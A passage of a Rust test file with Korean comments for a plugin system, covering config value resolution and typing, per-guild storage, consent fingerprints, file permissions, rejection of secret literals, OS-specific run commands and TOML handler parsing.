    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 체크박스는 **bool 로** 온다. 문자열 `"true"` 면 `if config(k)` 가 안 돈다 —
/// rhai 는 문자열을 조건으로 못 쓴다.
#[test]
fn config_keeps_its_type() {
    let _guard = env_lock();
    let home = fresh_tmp("cfgtype-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("cfgtype");
    let mut d = telegram_def();
    d["inputs"][3] = json!({ "key": "LIMIT", "type": "number", "default": 5 });
    write_plugin(&g, "tg", d);

    let p = load_all(&g).needs_consent.into_iter().next().unwrap();
    let r = crate::plugins::values::resolve(&g, &p.def);
    assert_eq!(r["ON_CREATED"].value, Some(json!(true)));
    assert!(r["LIMIT"].value.as_ref().unwrap().is_number());

    // 치환 쪽은 문자열이다 — url 에 `true` 가 들어가야지 `"true"` 면 안 된다.
    assert_eq!(r["ON_CREATED"].as_str().as_deref(), Some("true"));

    // **환경변수 경로가 진짜 시험 대상이다.** 환경변수는 문자열뿐이라, 선언한
    // 형으로 바꿔 주지 않으면 체크박스에 `"false"` 라는 **참인 문자열**이 들어가
    // `if config(k)` 가 항상 참이 된다. 기본값 경로만 보면 이걸 못 잡는다.
    unsafe { std::env::set_var("ON_COMMENT", "false") };
    unsafe { std::env::set_var("LIMIT", "12") };
    let r = crate::plugins::values::resolve(&g, &p.def);
    assert_eq!(
        r["ON_COMMENT"].value,
        Some(json!(false)),
        "환경변수의 \"false\" 가 bool 로 안 바뀌었다"
    );
    assert!(
        r["LIMIT"].value.as_ref().unwrap().is_number(),
        "환경변수의 숫자가 문자열로 남았다"
    );
    unsafe { std::env::remove_var("ON_COMMENT") };
    unsafe { std::env::remove_var("LIMIT") };

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 해석 순서 — 저장값 → 환경변수 → 기본값. 환경변수 칸이 "모든 길드 공통"
/// 자리 노릇을 한다.
#[test]
fn stored_beats_env_beats_default() {
    let _guard = env_lock();
    let home = fresh_tmp("cfgorder-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("cfgorder");
    write_plugin(&g, "tg", telegram_def());
    let p = load_all(&g).needs_consent.into_iter().next().unwrap();

    // 아무것도 없으면 기본값.
    let r = crate::plugins::values::resolve(&g, &p.def);
    assert_eq!(
        r["INTERVAL"].source,
        crate::plugins::values::Source::Default
    );
    assert_eq!(
        r["BOT_TOKEN"].source,
        crate::plugins::values::Source::Missing
    );

    // 환경변수가 기본값을 이긴다.
    unsafe { std::env::set_var("INTERVAL", "5m") };
    let r = crate::plugins::values::resolve(&g, &p.def);
    assert_eq!(r["INTERVAL"].as_str().as_deref(), Some("5m"));
    assert_eq!(r["INTERVAL"].source, crate::plugins::values::Source::Env);

    // 저장값이 환경변수를 이긴다.
    crate::plugins::values::set(&g, "tg", "INTERVAL", Some(json!("now"))).unwrap();
    let r = crate::plugins::values::resolve(&g, &p.def);
    assert_eq!(r["INTERVAL"].as_str().as_deref(), Some("now"));
    assert_eq!(r["INTERVAL"].source, crate::plugins::values::Source::Stored);

    unsafe { std::env::remove_var("INTERVAL") };
    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 같은 플러그인이 길드마다 다른 값을 갖는다 — 알릴 방이 프로젝트마다 다르다.
#[test]
fn values_are_per_guild() {
    let _guard = env_lock();
    let home = fresh_tmp("cfgguild-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let a = fresh_tmp("cfgguild-a");
    let b = fresh_tmp("cfgguild-b");
    crate::plugins::values::set(&a, "tg", "CHAT", Some(json!("방A"))).unwrap();
    crate::plugins::values::set(&b, "tg", "CHAT", Some(json!("방B"))).unwrap();
    assert_eq!(
        crate::plugins::values::stored(&a, "tg")["CHAT"],
        json!("방A")
    );
    assert_eq!(
        crate::plugins::values::stored(&b, "tg")["CHAT"],
        json!("방B")
    );
    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&a);
    let _ = std::fs::remove_dir_all(&b);
    let _ = std::fs::remove_dir_all(&home);
}

/// **값을 바꿔도 동의가 안 풀린다.** 토큰을 갱신할 때마다 재동의면 못 쓴다.
/// 반대로 `inputs` 선언이 바뀌면 풀려야 한다 — 요구하는 값이 달라진 것이다.
#[test]
fn changing_a_value_does_not_revoke_consent() {
    let _guard = env_lock();
    let home = fresh_tmp("cfgconsent-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("cfgconsent");
    write_plugin(&g, "tg", telegram_def());
    let p = load_all(&g).needs_consent.into_iter().next().unwrap();
    consent::grant(&g, &p).unwrap();
    assert_eq!(load_all(&g).active.len(), 1);

    crate::plugins::values::set(&g, "tg", "BOT_TOKEN", Some(json!("새-토큰"))).unwrap();
    assert_eq!(
        load_all(&g).active.len(),
        1,
        "값을 바꿨다고 동의가 풀렸다 — 토큰 갱신마다 재동의가 된다"
    );

    // 선언이 바뀌면 다시 묻는다.
    let mut d = telegram_def();
    d["inputs"].as_array_mut().unwrap().push(json!({
        "key": "NEW_ONE", "label": "새 값"
    }));
    write_plugin(&g, "tg", d);
    assert_eq!(
        load_all(&g).active.len(),
        0,
        "요구하는 값이 늘었는데 다시 안 물었다"
    );

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 값 파일은 소유자만 읽는다(0600). 평문으로 토큰이 들어 있다.
#[cfg(unix)]
#[test]
fn the_value_file_is_not_world_readable() {
    use std::os::unix::fs::PermissionsExt;
    let _guard = env_lock();
    let home = fresh_tmp("cfgperm-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("cfgperm");
    crate::plugins::values::set(&g, "tg", "BOT_TOKEN", Some(json!("비밀"))).unwrap();
    let mode = std::fs::metadata(crate::plugins::values::path().unwrap())
        .unwrap()
        .permissions()
        .mode()
        & 0o777;
    assert_eq!(mode, 0o600, "권한이 {mode:o} — 같은 기계의 남이 읽는다");
    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 화면에서 드러날 잘못은 적재에서 잡는다.
#[test]
fn broken_input_declarations_are_caught_at_load() {
    let cases: Vec<(&str, serde_json::Value)> = vec![
        (
            "선택지 없는 select",
            json!([{ "key": "A", "type": "select" }]),
        ),
        (
            "options 에 없는 default",
            json!([{ "key": "A", "type": "select", "default": "z",
                     "options": [{ "value": "a" }] }]),
        ),
        (
            "select 가 아닌데 options",
            json!([{ "key": "A", "options": [{ "value": "a" }] }]),
        ),
        (
            "checkbox 인데 default 가 bool 이 아님",
            json!([{ "key": "A", "type": "checkbox", "default": "yes" }]),
        ),
        ("빈 key", json!([{ "key": "  " }])),
        ("키에 못 쓰는 문자", json!([{ "key": "A B" }])),
        (
            "겹치는 key",
            json!([{ "key": "A" }, { "key": "A", "label": "또" }]),
        ),
    ];
    for (why, inputs) in cases {
        let mut d = post_def();
        d.inputs = serde_json::from_value(inputs).unwrap();
        assert!(validate(&d).is_err(), "통과하면 안 된다: {why}");
    }
}

/// `help` 에 예시랍시고 진짜 토큰을 적는 사고가 제일 흔하다.
#[test]
fn a_secret_in_an_input_help_is_rejected() {
    let mut d = post_def();
    d.inputs = vec![Input {
        key: "TOKEN".into(),
        label: None,
        input_type: InputType::Text,
        help: Some("예: sk-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123".into()),
        secret: true,
        default: None,
        options: Vec::new(),
    }];
    let e = validate(&d).unwrap_err().to_string();
    assert!(e.contains("help"), "{e}");
}

/// 선언이 없으면 직렬화에 안 나타난다 — 이 필드가 생긴 것만으로 기존 동의가
/// 전부 무효가 되면 안 된다([[REQ-020]] 과 같은 이유).
#[test]
fn absent_inputs_do_not_change_the_fingerprint() {
    let d = post_def();
    let json = serde_json::to_value(&d).unwrap();
    assert!(json.get("inputs").is_none(), "{json}");
}

/// **안내문은 이름 때문에 거부되면 안 된다.**
///
/// `inputs.TELEGRAM_BOT_TOKEN.help` 는 필드 이름에 `token` 이 들어간다. 비밀값
/// 검사의 "이름이 비밀을 뜻하면 값도 환경변수 참조여야 한다" 규칙을 산문에도
/// 걸면, "봇 토큰은 @BotFather 에게 받습니다" 라는 **안내문이 통째로 거부된다.**
/// 배포하는 텔레그램 예제를 쓰다 실제로 밟았다 — [[DEV-380]] 에서 `task-runner`
/// 가 `sk-` 를 품어 거부되던 것과 같은 계열의 오탐이다.
#[test]
fn help_text_is_not_rejected_just_because_the_key_says_token() {
    let mut d = post_def();
    d.inputs = vec![Input {
        key: "TELEGRAM_BOT_TOKEN".into(),
        label: Some("봇 토큰".into()),
        input_type: InputType::Text,
        help: Some("텔레그램에서 @BotFather 에게 /newbot 하면 받습니다.".into()),
        secret: true,
        default: None,
        options: Vec::new(),
    }];
    assert!(
        validate(&d).is_ok(),
        "평범한 안내문이 거부됐다: {:?}",
        validate(&d).unwrap_err().to_string()
    );

    // 그래도 **진짜 토큰**은 막는다 — 접두사 검사는 그대로다.
    d.inputs[0].help = Some("예: sk-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123".into());
    assert!(validate(&d).is_err(), "help 안의 진짜 키가 통과했다");
}

/// **선언 안 하고 쓰기만 한 값도 입력란이 생긴다.**
///
/// admin 이 배포 예제의 옛 사본에서 봤다("입력창 안보인다"). 그 정의는 url 에서
/// `${TELEGRAM_BOT_TOKEN}` 을 쓰는데 `inputs` 를 안 적었다 — 안 그리면 값을
/// 넣을 자리가 화면 어디에도 없어서 **그 플러그인은 영영 못 돈다.**
/// 이 기능이 생기기 전에 쓴 정의는 전부 이 상태다.
#[test]
fn a_referenced_but_undeclared_value_still_gets_an_input() {
    let mut d = def(Action::Post {
        url: "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage".into(),
        headers: [(
            "Authorization".to_string(),
            "Bearer ${HOOK_TOKEN}".to_string(),
        )]
        .into_iter()
        .collect(),
        body_env: [("chat_id".to_string(), "TELEGRAM_CHAT_ID".to_string())]
            .into_iter()
            .collect(),
        timeout_ms: None,
    });
    assert!(d.inputs.is_empty(), "전제: 아무것도 선언 안 했다");

    let eff = d.effective_inputs();
    let keys: Vec<&str> = eff.iter().map(|i| i.key.as_str()).collect();
    assert!(keys.contains(&"TELEGRAM_BOT_TOKEN"), "{keys:?}");
    assert!(
        keys.contains(&"HOOK_TOKEN"),
        "헤더의 참조를 놓쳤다: {keys:?}"
    );
    assert!(
        keys.contains(&"TELEGRAM_CHAT_ID"),
        "body_env 는 `${{}}` 문법이 아니라 값이 곧 이름이다: {keys:?}"
    );

    // 이름이 비밀을 뜻하면 가린다 — 붙여넣은 토큰이 평문으로 보이면 안 된다.
    let tok = eff.iter().find(|i| i.key == "TELEGRAM_BOT_TOKEN").unwrap();
    assert!(tok.secret, "TOKEN 이 들어간 이름인데 안 가렸다");
    let chat = eff.iter().find(|i| i.key == "TELEGRAM_CHAT_ID").unwrap();
    assert!(!chat.secret, "CHAT_ID 는 비밀이 아니다");

    // 선언이 있으면 그쪽이 이긴다 — 지어낸 것이 라벨을 덮으면 안 된다.
    d.inputs = vec![Input {
        key: "TELEGRAM_BOT_TOKEN".into(),
        label: Some("봇 토큰".into()),
        input_type: InputType::Text,
        help: None,
        secret: true,
        default: None,
        options: Vec::new(),
    }];
    let eff = d.effective_inputs();
    assert_eq!(
        eff.iter().filter(|i| i.key == "TELEGRAM_BOT_TOKEN").count(),
        1,
        "선언한 것과 지어낸 것이 둘 다 생겼다"
    );
    assert_eq!(eff[0].label(), "봇 토큰");
}

/// 코어가 채우는 경로는 사용자에게 물을 값이 아니다([[BUG-279]]).
#[test]
fn core_provided_paths_are_not_asked_for() {
    let d = def(Action::Run {
        command: "sh".into(),
        args: vec!["${OPENGUILD_PLUGIN_DIR}/hook.sh".into(), "${MY_KEY}".into()],
        timeout_ms: None,
        os: Default::default(),
    });
    let eff = d.effective_inputs();
    let keys: Vec<&str> = eff.iter().map(|i| i.key.as_str()).collect();
    assert!(!keys.contains(&"OPENGUILD_PLUGIN_DIR"), "{keys:?}");
    assert!(keys.contains(&"MY_KEY"), "{keys:?}");
}

// ── BUG-294: 운영체제별 run 명령 ──

fn run_with_windows(windows_args: &[&str]) -> PluginDef {
    serde_json::from_value(to_new_shape(json!({
        "name": "cross", "on": ["quest.created"], "scope": ["cli"],
        "action": { "run": {
            "command": "sh", "args": ["${OPENGUILD_PLUGIN_DIR}/hook.sh"],
            "windows": { "command": "powershell", "args": windows_args }
        } }
    })))
    .unwrap()
}

/// 이 기계의 OS 에 적힌 것이 있으면 그것을, 없으면 기본 명령을 띄운다.
#[test]
fn run_picks_the_command_for_this_os() {
    let d = run_with_windows(&["-File", "${OPENGUILD_PLUGIN_DIR}/hook.ps1"]);
    let (cmd, args) = def_action(&d).run_command().unwrap();
    if cfg!(windows) {
        assert_eq!(cmd, "powershell");
        assert_eq!(args[0], "-File");
    } else {
        assert_eq!(cmd, "sh", "Windows 용이 다른 OS 에서 골라졌다");
        assert_eq!(args.len(), 1);
    }
    assert!(validate(&d).is_ok());
    // post 는 띄울 명령이 없다.
    let p = def(Action::Post {
        url: "https://x.test".into(),
        headers: Default::default(),
        body_env: Default::default(),
        timeout_ms: None,
    });
    assert!(def_action(&p).run_command().is_none());
}

/// OS 별 명령이 **없으면 직렬화에 안 나타난다** — 동의 지문이 정의를 통째로 담으므로, 나타나면
/// 이 필드가 생긴 것만으로 기존 동의가 전부 풀린다.
#[test]
fn a_run_without_os_commands_serializes_as_before() {
    let d = def(Action::Run {
        command: "sh".into(),
        args: vec!["hook.sh".into()],
        timeout_ms: None,
        os: Default::default(),
    });
    let v = serde_json::to_value(def_action(&d)).unwrap();
    assert_eq!(v, json!({ "run": { "command": "sh", "args": ["hook.sh"] } }));
    // 있으면 그대로 왕복한다.
    let w = run_with_windows(&["-File", "x.ps1"]);
    let back: PluginDef = serde_json::from_value(serde_json::to_value(&w).unwrap()).unwrap();
    assert_eq!(back, w);
}

/// 다른 OS 것도 검증한다 — git 에 올라가는 것은 정의 전체다. 키 리터럴은 거절하고,
/// 환경변수 참조는 입력으로 잡는다(이 기계에서 안 쓰는 OS 것이어도).
#[test]
fn os_specific_commands_are_validated_everywhere() {
    let bad = run_with_windows(&["-Token", "ghp_xxxxxxxxxxxxxxxx"]);
    let e = validate(&bad).unwrap_err().to_string();
    assert!(e.contains("windows.args[1]"), "{e}");
    let refs = run_with_windows(&["-File", "${WIN_ONLY_DIR}/hook.ps1"]);
    let keys: Vec<String> = refs.effective_inputs().into_iter().map(|i| i.key).collect();
    assert!(keys.contains(&"WIN_ONLY_DIR".to_string()), "{keys:?}");
}

/// BUG-294: 옛 빌드가 Windows 에서 `\\?\` 를 붙여 적어 둔 소스도 읽힌다 — 훅에는 뗀 경로로
/// 넘어가고, 같은 폴더를 다시 더해도 소스가 늘지 않으며, 다음에 쓸 때 파일도 고쳐진다.
#[test]
fn a_source_recorded_with_a_verbatim_prefix_still_works() {
    use super::sources;
    let _guard = env_lock();
    let home = fresh_tmp("verb-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("verb-guild");
    let src = fresh_tmp("verb-src");
    let dir = std::fs::canonicalize(&src).unwrap();
    std::fs::write(
        dir.join(MANIFEST),
        manifest_text(json!({
            "name": "old-one", "on": ["quest.created"], "scope": ["cli"],
            "action": { "post": { "url": "https://example.test/x" } }
        })),
    )
    .unwrap();
    let raw = format!(r"\\?\{}", dir.display());
    let key = crate::recents::normalize_abs(&g);
    std::fs::write(
        sources::path().unwrap(),
        serde_json::to_string(&json!({
            "sources": { "old": raw },
            "used": { key: [{ "source": "old", "folder": "." }] }
        }))
        .unwrap(),
    )
    .unwrap();

    let l = load_for(&g, Scope::Cli);
    assert_eq!(names(&l), vec!["old-one"], "옛 기록의 소스가 안 실렸다: {:?}", l.errors);
    assert!(!l.needs_consent[0].dir.to_string_lossy().starts_with(r"\\?\"));
    // 같은 폴더를 다시 더하면 옛 소스를 알아본다.
    assert_eq!(sources::add_source(&g, &src, None).unwrap(), "old");
    // 다음 쓰기(이미 쓰는 것을 또 쓰기 — 멱등)에서 파일도 고쳐진다.
    sources::use_plugin(&g, "old", ".").unwrap();
    let written = std::fs::read_to_string(sources::path().unwrap()).unwrap();
    assert!(!written.contains(r"\\?\"), "{written}");

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    for d in [&g, &src, &home] {
        let _ = std::fs::remove_dir_all(d);
    }
}

// ── DEV-403: plugin.toml 과 줄 단위 핸들러 ──────────────────

fn parse(src: &str) -> Result<PluginDef, String> {
    parse_def(src).map_err(|e| e.to_string())
}

const BASE: &str = r#"
name  = "t"
scope = ["cli"]
scripts = ["main.rhai"]

[actions.out.post]
    url = "https://x.test"
"#;

/// 사람이 쓰는 모양 그대로 읽힌다 — 들여쓰기·주석·한 플러그인에 액션 줄과 스크립트 줄.
#[test]
fn a_toml_definition_with_mixed_lines_reads_as_written() {
    let d = parse(&format!(
        r#"{BASE}
# 주석도 된다
[[handlers]]
    id     = "바로"
    post   = ["quest.created"]
    action = "out"

[[handlers]]
    id   = "스크립트"
    post = ["comment.added", "quest.*"]
    call = "on_comment"

[[handlers]]
    pre  = ["quest.deleted"]
    [handlers.action.run]
        command = "sh"
        args    = ["-c", "cat"]
"#
    ))
    .unwrap();
    assert_eq!(d.handlers.len(), 3);
    assert_eq!(d.handlers[0].id.as_deref(), Some("바로"));
    assert!(matches!(d.handlers[0].action, Some(ActionRef::Named(ref n)) if n == "out"));
    assert_eq!(d.handlers[1].call.as_deref(), Some("on_comment"));
    assert!(matches!(d.handlers[2].action, Some(ActionRef::Inline(Action::Run { .. }))));
    assert_eq!(d.handlers[2].label(2), "3번째 줄");
    assert_eq!(
        d.subscriptions(),
        vec!["quest.created", "comment.added", "quest.*", "pre:quest.deleted"]
    );
    use crate::events::Phase;
    assert!(d.handlers[1].wants("quest.status_changed", Phase::Post));
    assert!(!d.handlers[1].wants("quest.status_changed", Phase::Pre));
    assert!(d.handlers[2].wants("quest.deleted", Phase::Pre));
    assert!(!d.handlers[2].wants("quest.deleted", Phase::Post));
}

/// 줄마다 "언제" 하나, "무엇" 하나 — 어기면 이유와 함께 거절.
#[test]
fn each_line_needs_exactly_one_when_and_one_what() {
    let cases = [
        ("[[handlers]]\ncall = \"h\"", "언제"),
        ("[[handlers]]\npost = [\"quest.created\"]\npre = [\"quest.deleted\"]\ncall = \"h\"", "같이"),
        ("[[handlers]]\npost = [\"quest.created\"]", "무엇"),
        ("[[handlers]]\npost = [\"quest.created\"]\ncall = \"h\"\naction = \"out\"", "같이"),
        ("[[handlers]]\npost = [\"quest.created\"]\naction = \"nope\"", "nope"),
        ("[[handlers]]\nid = \"a\"\npost = [\"quest.created\"]\naction = \"out\"\n[[handlers]]\nid = \"a\"\npost = [\"quest.created\"]\naction = \"out\"", "겹"),
        ("[[handlers]]\npost = [\"quest.creted\"]\naction = \"out\"", "quest.creted"),
        ("[[handlers]]\npre = [\"quest.created\"]\naction = \"out\"", "pre"),
    ];
    for (lines, want) in cases {
        let e = parse(&format!("{BASE}\n{lines}\n")).unwrap_err();
        assert!(e.contains(want), "{lines}\n→ {e}");
    }
    // 줄이 하나도 없으면 안 된다.
    let e = parse(BASE).unwrap_err();
    assert!(e.contains("handlers"), "{e}");
    // 스크립트 없이 함수를 부를 수 없다.
    let e = parse(
        "name = \"t\"\nscope = [\"cli\"]\n[[handlers]]\npost = [\"quest.created\"]\ncall = \"h\"\n",
    )
    .unwrap_err();
    assert!(e.contains("scripts"), "{e}");
}

/// 모르는 칸은 조용히 무시하지 않는다 — `handler` 같은 오타, 옛 `on`/`action`.
#[test]
fn unknown_keys_are_refused_not_ignored() {
    let e = parse(&format!(
        "{BASE}\n[[handlers]]\npost = [\"quest.created\"]\naction = \"out\"\nwhne = 1\n"
    ))
    .unwrap_err();
    assert!(e.contains("whne"), "{e}");
    let e = parse(
        "name = \"t\"\nscope = [\"cli\"]\non = [\"quest.created\"]\n[action.post]\nurl = \"https://x.test\"\n",
    )
    .unwrap_err();
    assert!(e.contains("on") || e.contains("action"), "{e}");
}

/// 줄이 부르는 함수가 스크립트에 없으면 **적재 때** 걸린다. 옛 plugin.json 만 있는 폴더는
/// 조용히 사라지지 않고 옮기라고 알린다.
#[test]
fn a_missing_function_and_a_leftover_plugin_json_are_reported() {
    let _guard = env_lock();
    let home = fresh_tmp("t403-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("t403");
    write_plugin(&g, "ai-notify", with_script(&["cli"], "t.rhai"));
    write_script(&g, "ai-notify", "t.rhai", r#"fn other(e) { send("out", e) }"#);
    let old = plugins_dir(&g).join("legacy");
    std::fs::create_dir_all(&old).unwrap();
    std::fs::write(old.join(OLD_MANIFEST), "{}").unwrap();

    let l = load_all(&g);
    assert!(l.active.is_empty() && l.needs_consent.is_empty());
    let msgs: Vec<String> = l.errors.iter().map(|(_, m)| m.clone()).collect();
    assert_eq!(msgs.len(), 2, "{msgs:?}");
    assert!(msgs.iter().any(|m| m.contains("`h`")), "{msgs:?}");
    assert!(msgs.iter().any(|m| m.contains("plugin.toml")), "{msgs:?}");

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 비밀값 검사는 이름 붙인 동작과 줄에 적은 동작 **모두**를 본다. 동작 이름에 token 이
/// 들어 있다고 멀쩡한 url 이 걸리지는 않는다.
#[test]
fn secret_checks_cover_named_and_inline_actions() {
    let e = parse(
        "name = \"t\"\nscope = [\"cli\"]\n[actions.sync.post]\nurl = \"https://x.test\"\nheaders = { Authorization = \"Pa55word\" }\n[[handlers]]\npost = [\"quest.created\"]\naction = \"sync\"\n",
    )
    .unwrap_err();
    assert!(e.contains("sync.headers.Authorization"), "{e}");
    let e = parse(
        "name = \"t\"\nscope = [\"cli\"]\n[[handlers]]\npost = [\"quest.created\"]\n[handlers.action.run]\ncommand = \"curl\"\nargs = [\"ghp_xxxxxxxxxxxxxxxx\"]\n",
    )
    .unwrap_err();
    assert!(e.contains("handlers[0].action.args[0]"), "{e}");
    assert!(
        parse(
            "name = \"t\"\nscope = [\"cli\"]\n[actions.token-sync.post]\nurl = \"https://x.test\"\n[[handlers]]\npost = [\"quest.created\"]\naction = \"token-sync\"\n",
        )
        .is_ok()
    );
    // 이름 붙인 동작이 쓰는 값도 입력란이 된다.
    let d = parse(
        "name = \"t\"\nscope = [\"cli\"]\n[actions.a.post]\nurl = \"https://x.test/${A_KEY}\"\nbody_env = { chat = \"CHAT\" }\n[[handlers]]\npost = [\"quest.created\"]\naction = \"a\"\n",
    )
    .unwrap();
    let keys: Vec<String> = d.effective_inputs().into_iter().map(|i| i.key).collect();
    assert_eq!(keys, vec!["A_KEY", "CHAT"]);
}

// ── DEV-405: with — 연결된 데이터 ──────────────────────────

fn with_line(post: &str, with: &str, call: &str) -> String {
    format!("{BASE}\n[[handlers]]\npost = [{post}]\nwith = [{with}]\ncall = \"{call}\"\n")
}

/// 받을 수 있는 것은 이벤트 대상의 종류가 정한다 — 틀리면 쓸 수 있는 것을 알려 준다.
#[test]
fn with_is_checked_against_what_the_events_can_give() {
    // 댓글은 퀘스트·캠페인에 달린다 — 둘의 것을 모두 받을 수 있다.
    assert!(parse(&with_line("\"comment.added\"", "\"subject\", \"parent\", \"quests\"", "h")).is_ok());
    let e = parse(&with_line("\"campaign.created\"", "\"parent\"", "h")).unwrap_err();
    assert!(e.contains("parent") && e.contains("subject, quests"), "{e}");
    let e = parse(&with_line("\"backup.created\"", "\"subject\"", "h")).unwrap_err();
    assert!(e.contains("없습니다"), "{e}");
    let e = parse(&with_line("\"quest.created\"", "\"subject\", \"subject\"", "h")).unwrap_err();
    assert!(e.contains("두 번"), "{e}");
    // 동작 줄도 받을 수 있다 — 조건(`when`)이 그 데이터를 본다(REQ-025).
    assert!(
        parse(&format!(
            "{BASE}\n[[handlers]]\npost = [\"quest.created\"]\nwith = [\"subject\"]\naction = \"out\"\n[handlers.when]\n\"subject.tags\" = \"notify\"\n"
        ))
        .is_ok()
    );
    assert_eq!(
        related::available_for(&["quest.*".into()], crate::events::Phase::Post),
        vec!["subject", "parent", "children", "prereqs", "campaigns"]
    );
}

/// 함수는 이벤트 + `with` 개수만큼 인자를 받아야 한다 — 모자라면 적재 때 모양을 알려 준다.
#[test]
fn a_handler_with_with_needs_matching_parameters() {
    let _guard = env_lock();
    let home = fresh_tmp("witharity-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("witharity");
    let dir = plugins_dir(&g).join("w");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join(MANIFEST),
        with_line("\"comment.added\"", "\"subject\", \"parent\"", "on_comment"),
    )
    .unwrap();
    std::fs::write(dir.join("main.rhai"), "fn on_comment(e) { }").unwrap();
    let l = load_all(&g);
    assert_eq!(l.errors.len(), 1, "{:?}", l.errors);
    assert!(l.errors[0].1.contains("fn on_comment(e, subject, parent)"), "{:?}", l.errors);

    std::fs::write(dir.join("main.rhai"), "fn on_comment(e, s, p) { }").unwrap();
    assert!(load_all(&g).errors.is_empty());

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 파일에서 읽은 관계가 맞다 — 부모·하위·선행·캠페인, 캠페인의 퀘스트, 없는 것은 null.
#[tokio::test]
async fn related_data_is_read_from_the_guild_files() {
    use crate::events::Subject;
    let g = fresh_tmp("related");
    crate::repo::seed_guild_dir(&g).unwrap();
    let store = crate::Store::open(&g).await.unwrap();
    let mk = |title: &str, parent: Option<i64>| crate::models::CreateQuestRequest {
        quest_type_id: 1,
        title: title.into(),
        description: None,
        status_slug: "open".into(),
        urgency: Some(3),
        parent_quest_id: parent,
    };
    let top = crate::ops::quests::create_quest(&store, mk("부모", None)).await.unwrap();
    let kid = crate::ops::quests::create_quest(&store, mk("자식", Some(top.id))).await.unwrap();
    let pre = crate::ops::quests::create_quest(&store, mk("선행", None)).await.unwrap();
    crate::ops::quests::add_prerequisite(
        &store,
        kid.id,
        crate::models::AddPrerequisiteRequest { prerequisite_id: pre.id },
    )
    .await
    .unwrap();
    crate::ops::quests::set_quest_tags(&store, kid.id, vec!["notify".into()]).await.unwrap();
    let camp = crate::ops::campaigns::create_campaign(
        &store,
        crate::models::CreateCampaignRequest {
            title: "베타".into(),
            description: None,
            started_at: None,
            ended_at: None,
        },
    )
    .await
    .unwrap();
    crate::ops::campaigns::link_quest_by_slug(&store, camp.id, &kid.quest_id).await.unwrap();

    let q = |id: &str| Subject { kind: "quest", id: id.into() };
    let load = |s: &Subject, w: &str| related::load(&g, s, w);

    let sub = load(&q(&kid.quest_id), "subject");
    assert_eq!(sub["title"], "자식");
    assert_eq!(sub["tags"], json!(["notify"]));
    assert_eq!(sub["type"], "DEV");
    assert_eq!(load(&q(&kid.quest_id), "parent")["id"], top.quest_id);
    assert!(load(&q(&top.quest_id), "parent").is_null());
    assert_eq!(load(&q(&top.quest_id), "children")[0]["id"], kid.quest_id);
    assert_eq!(load(&q(&kid.quest_id), "prereqs")[0]["id"], pre.quest_id);
    assert_eq!(load(&q(&kid.quest_id), "campaigns")[0]["id"], camp.campaign_slug);
    assert_eq!(load(&q(&top.quest_id), "campaigns"), json!([]));
    let c = Subject { kind: "campaign", id: camp.campaign_slug.clone() };
    assert_eq!(load(&c, "subject")["title"], "베타");
    assert_eq!(load(&c, "quests")[0]["id"], kid.quest_id);
    // 대상에 없는 것, 없는 대상.
    assert!(load(&c, "parent").is_null());
    assert!(load(&q("DEV-999"), "subject").is_null());

    let _ = std::fs::remove_dir_all(&g);
}

/// **이 기능이 풀려는 것** — "notify 태그가 붙은 퀘스트의 댓글만" 알리기. 댓글 이벤트에는 퀘스트
/// 태그가 없어서 지금까지는 못 했다.
#[tokio::test]
async fn a_comment_handler_can_see_its_quests_tags() {
    #[derive(Default)]
    struct Sent(std::sync::Mutex<Vec<serde_json::Value>>);
    impl runtime::Delivery for Sent {
        fn deliver(
            &self,
            _p: &Plugin,
            _a: &Action,
            _e: &crate::events::Event,
            b: &serde_json::Value,
            _v: &std::collections::BTreeMap<String, String>,
        ) -> Result<(), String> {
            self.0.lock().unwrap().push(b.clone());
            Ok(())
        }
    }
    let home = fresh_tmp("withtag-home");
    let g = fresh_tmp("withtag");
    crate::repo::seed_guild_dir(&g).unwrap();
    let dir = plugins_dir(&g).join("tagged");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join(MANIFEST),
        with_line("\"comment.added\"", "\"subject\"", "on_comment"),
    )
    .unwrap();
    std::fs::write(
        dir.join("main.rhai"),
        r#"fn on_comment(e, quest) {
             if quest.tags.contains("notify") { send("out", #{ q: quest.id, body: e.comment.body }) }
           }"#,
    )
    .unwrap();
    let store = crate::Store::open(&g).await.unwrap();
    let sent = std::sync::Arc::new(Sent::default());
    let loaded = {
        let _guard = env_lock();
        unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
        consent::enable_auto_allow(&g).unwrap();
        let l = store.install_plugins(Scope::Cli, sent.clone());
        unsafe { std::env::remove_var("OPENGUILD_HOME") };
        l
    };
    assert_eq!(loaded.active.len(), 1, "{:?}", loaded.errors);
